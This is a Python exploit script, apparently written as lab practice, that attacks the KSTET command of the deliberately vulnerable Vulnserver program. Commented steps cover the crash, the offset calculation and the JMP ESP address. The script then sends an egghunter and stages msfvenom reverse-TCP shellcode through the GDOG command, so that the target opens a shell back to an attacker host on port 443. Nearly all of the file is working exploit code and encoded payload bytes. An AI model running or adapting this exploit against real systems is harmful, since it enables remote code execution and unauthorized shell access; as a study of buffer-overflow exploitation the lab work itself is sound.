#!/usr/bin/python

import socket
import os, sys
import sys

host = "192.168.112.145"
port = 9999

# 1 - crash
# buffer = "KSTET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 2 - offset calculation
# /usr/bin/msf-pattern_create -l 260
#buffer = "KSTET Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"

# 3 - Check EIP
# /usr/bin/msf-pattern_offset -l 260 -q 63413363
# [*] Exact match at offset 70
# buffer = "KSTET "+"A"*(70)+"BBBB"+"C"*(260-70-len("KSTET "))


# 4 - Egghunter
# egghunt.exe -cstyle R1cK
# Search for > Command > JMP ESP   -----> 776CE871
jmp_esp = "\x71\xe8\x6c\x77";
egg = "\x77\x65\x62\x6f";
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+"\x77\x65\x62\x6f"+"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";
buffer = "KSTET "+egghunter+"A"*(70-len(egghunter))+jmp_esp+"\x90"*2+"\xeb\xb2"+"C"*(260-70-len("KSTET ")-4)

# 5 - Check egg found
# buffer = "KSTET "+egghunter+"A"*(70-len(egghunter))+jmp_esp+"\x90"*2+"\xeb\xb2"+2*(egg)+"C"*(260-70-len("KSTET ")-4-2*len(egg))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)

# 6 - Final
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.112.143 LPORT=443 -e x86/alpha_mixed -f py
buf = "\x89\xe0\xdb\xd0\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x6d\x38\x4f\x72\x63\x30\x45\x50\x75\x50\x75\x30\x6d\x59\x6d\x35\x64\x71\x39\x50\x30\x64\x4e\x6b\x36\x30\x54\x70\x6e\x6b\x61\x42\x46\x6c\x6c\x4b\x52\x72\x35\x44\x4c\x4b\x64\x32\x61\x38\x34\x4f\x4c\x77\x52\x6a\x66\x46\x50\x31\x4b\x4f\x6c\x6c\x65\x6c\x53\x51\x73\x4c\x73\x32\x34\x6c\x45\x70\x4a\x61\x7a\x6f\x34\x4d\x45\x51\x79\x57\x79\x72\x39\x62\x46\x32\x42\x77\x6c\x4b\x52\x72\x72\x30\x6c\x4b\x51\x5a\x57\x4c\x4c\x4b\x42\x6c\x77\x61\x34\x38\x58\x63\x30\x48\x56\x61\x4e\x31\x52\x71\x6e\x6b\x32\x79\x47\x50\x43\x31\x39\x43\x6e\x6b\x71\x59\x66\x78\x38\x63\x34\x7a\x50\x49\x4c\x4b\x45\x64\x6c\x4b\x77\x71\x78\x56\x45\x61\x39\x6f\x6e\x4c\x69\x51\x58\x4f\x56\x6d\x53\x31\x48\x47\x76\x58\x4d\x30\x52\x55\x6b\x46\x65\x53\x31\x6d\x7a\x58\x45\x6b\x63\x4d\x64\x64\x52\x55\x58\x64\x71\x48\x6c\x4b\x31\x48\x47\x54\x43\x31\x79\x43\x53\x56\x4e\x6b\x76\x6c\x30\x4b\x4e\x6b\x42\x78\x57\x6c\x67\x71\x6b\x63\x6e\x6b\x66\x64\x4e\x6b\x53\x31\x4e\x30\x6b\x39\x37\x34\x74\x64\x46\x44\x71\x4b\x43\x6b\x55\x31\x42\x79\x73\x6a\x42\x71\x59\x6f\x4b\x50\x73\x6f\x61\x4f\x42\x7a\x4c\x4b\x72\x32\x5a\x4b\x4c\x4d\x51\x4d\x65\x38\x45\x63\x64\x72\x67\x70\x57\x70\x72\x48\x34\x37\x44\x33\x50\x32\x51\x4f\x71\x44\x75\x38\x42\x6c\x71\x67\x76\x46\x43\x37\x49\x6f\x48\x55\x4d\x68\x5a\x30\x75\x51\x67\x70\x65\x50\x61\x39\x7a\x64\x71\x44\x50\x50\x52\x48\x64\x69\x6d\x50\x70\x6b\x67\x70\x79\x6f\x78\x55\x36\x30\x50\x50\x76\x30\x52\x70\x31\x50\x36\x30\x67\x30\x30\x50\x51\x78\x49\x7a\x36\x6f\x6b\x6f\x6d\x30\x6b\x4f\x7a\x75\x4e\x77\x70\x6a\x66\x65\x42\x48\x49\x50\x69\x38\x50\x70\x4c\x4f\x35\x38\x45\x52\x77\x70\x55\x51\x6f\x4b\x4e\x69\x79\x76\x70\x6a\x36\x70\x36\x36\x72\x77\x75\x38\x6e\x79\x79\x35\x71\x64\x53\x51\x39\x6f\x4a\x75\x6b\x35\x4b\x70\x44\x34\x54\x4c\x69\x6f\x70\x4e\x37\x78\x70\x75\x58\x6c\x72\x48\x6a\x50\x4e\x55\x4f\x52\x33\x66\x4b\x4f\x39\x45\x55\x38\x52\x43\x42\x4d\x31\x74\x77\x70\x4f\x79\x58\x63\x63\x67\x32\x77\x61\x47\x66\x51\x58\x76\x62\x4a\x74\x52\x36\x39\x51\x46\x4a\x42\x39\x6d\x33\x56\x59\x57\x67\x34\x55\x74\x47\x4c\x55\x51\x57\x71\x4c\x4d\x30\x44\x37\x54\x72\x30\x7a\x66\x65\x50\x72\x64\x51\x44\x36\x30\x72\x76\x51\x46\x51\x46\x77\x36\x36\x36\x52\x6e\x32\x76\x33\x66\x32\x73\x61\x46\x53\x58\x44\x39\x5a\x6c\x35\x6f\x6c\x46\x69\x6f\x78\x55\x4e\x69\x79\x70\x30\x4e\x73\x66\x72\x66\x69\x6f\x76\x50\x75\x38\x37\x78\x4d\x57\x45\x4d\x61\x70\x59\x6f\x4a\x75\x4f\x4b\x78\x70\x6e\x55\x79\x32\x46\x36\x73\x58\x6f\x56\x6d\x45\x4d\x6d\x6f\x6d\x79\x6f\x79\x45\x75\x6c\x65\x56\x51\x6c\x46\x6a\x6f\x70\x59\x6b\x79\x70\x54\x35\x63\x35\x6d\x6b\x53\x77\x36\x73\x31\x62\x52\x4f\x30\x6a\x35\x50\x52\x73\x4b\x4f\x6e\x35\x41\x41"

# Other command -> eggs+payload
# I dont really understand why only using GDOG works. Source: https://sh3llc0d3r.com/vulnserver-kstet-command-exploit-with-egghunter/
s.send("GDOG " + 2*egg + buf)
print s.recv(1024)
# KSTET command
s.send(buffer)
print s.recv(1024)

s.close()

